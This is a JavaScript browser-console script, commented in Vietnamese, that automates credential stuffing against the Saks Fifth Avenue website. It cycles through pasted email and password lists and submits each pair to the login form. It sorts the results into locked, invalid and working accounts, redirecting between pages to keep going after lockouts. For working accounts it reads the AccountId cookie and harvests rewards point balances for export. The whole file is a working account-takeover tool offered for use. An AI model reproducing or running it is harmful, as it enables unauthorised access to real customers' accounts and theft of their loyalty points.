var data_input = JSON.parse(localStorage.getItem('data_input'));

var data_lock = JSON.parse(localStorage.getItem('data_lock'));

var data_invalid = JSON.parse(localStorage.getItem('data_invalid'));

var data_checked = JSON.parse(localStorage.getItem('data_checked'));

const url = [
    '/account/register',
    '/Entry.jsp',
    '/account/forgot-password',
]

var rand = url[Math.floor(Math.random() * url.length)];

function login(){
    var username = data_input[0][0];
    var password = data_input[0][1];
    setTimeout(() => {

        document.querySelector('#sign-into-account-email-field').value = username;
        document.querySelector('#sign-into-account-password-field').value = password;

        data_input.shift()
        data_checked.push([username, password])

        localStorage.setItem('data_input', JSON.stringify(data_input));
        localStorage.setItem('data_checked', JSON.stringify(data_checked));

        if(!document.querySelector('.account__alert'))
            document.querySelector('.sign-into-account__submit-button').click();
        setTimeout(() => {
            if(document.querySelector('.sign-in__account-locked')){

                data_lock.push([username, password])
                localStorage.setItem('data_lock', JSON.stringify(data_lock));
                document.location.reload()
                

            } else if(document.querySelector('.account__alert')){

                data_invalid.push([username, password])
                localStorage.setItem('data_invalid', JSON.stringify(data_invalid));
                     
                document.location.reload()

            } else if(!document.querySelector('.account-header__greeting')){

                data_input.push([username, password]);
                localStorage.setItem('data_input', JSON.stringify(data_input));
                data_checked.pop();
                localStorage.setItem('data_checked', JSON.stringify(data_checked));  
                     
                           
                document.location.pathname = rand

            } else {
              document.location.reload()
            }
        },7000) //  thoi gian cho truoc khi check xem login duoc hay khong, mac dinh 7s
    }, 3000) // thoi gian cho trc khi dien mat khau va email de login, giam xuong neu muon tang toc, hien tai la 5s
}

if(document.location.pathname=='/account/login' && data_input.length > 0){
    login() 
    setTimeout   
}

if(document.location.pathname == "/Entry.jsp"){

    document.location.pathname = '/account/login';
}
if(document.location.pathname == "/account/register"){

    document.location.pathname = '/account/login';
}
if(document.location.pathname == "/account/forgot-password"){

    document.location.pathname = '/account/login';
}

if(document.location.pathname == '/account/summary') {

    if(data_checked.length == 0 || data_checked[data_checked.length - 1].length == 2){

        var cookie = [];
        document.cookie.split('; ').forEach(ele => {

            ele = ele.split('=');
            cookie.push({
                key: ele[0],
                value: ele[1]
            })
        })
    
        var user_id = cookie.filter(ele => {

            return ele.key == "AccountId"
        })[0].value
        document.location.href = 'https://www.saksfifthavenue.com/v1/account-service/accounts/' + user_id + '/summary';

    } else if (data_checked[data_checked.length - 1].length == 3){

        setTimeout(() => {
            document.querySelector('.account-signout').click();
        }, 3000)

    } else {

        alert('please check again: ' + JSON.stringify(data_checked[data_checked.length - 1]));

    }
}


if(document.location.pathname.match(/\/v1\/account-service[^]*/)){

    var data = JSON.parse(document.querySelector('body pre').textContent);

    point = data.response.results.rewards.member_info.available_points;
    data_checked[data_checked.length - 1].push(point);
    localStorage.setItem('data_checked', JSON.stringify(data_checked));
    document.location.href = 'https://www.saksfifthavenue.com/account/summary';

}

// init data copy cai nay paste vao console dau tien, nho dien data raw vao input_string
var data_input = []
 var input_string = ''
 input_string = input_string.split(';');
 input_string.forEach((ele) => {
     data_input.push(ele.split(' | '));
 })
 localStorage.setItem('data_input' , JSON.stringify(data_input));
 localStorage.setItem('data_lock' , JSON.stringify([]));
 localStorage.setItem('data_invalid' , JSON.stringify([]));
 localStorage.setItem('data_checked' , JSON.stringify([]));
 // cach lay data sau khi check
 var data_input = JSON.parse(localStorage.getItem('data_input'));
 var data_lock = JSON.parse(localStorage.getItem('data_lock'));
 var data_invalid = JSON.parse(localStorage.getItem('data_invalid'));
 var data_checked = JSON.parse(localStorage.getItem('data_checked'));
 checked_has_point = data_checked.filter(ele => {return ele.length ==3}); // lay ra nhung account da check ma co point;
var string_need = '';
checked_has_point.forEach(ele => {
    string_need += ele[0] + ' | ' + ele[1] + ' | ' + (ele[2] == "" ? 0 : ele[2]) + ';'
})
string_need // chuoi can lay
//lay chuoi nay sang file khac roi replace ';' bang dau '\n' 
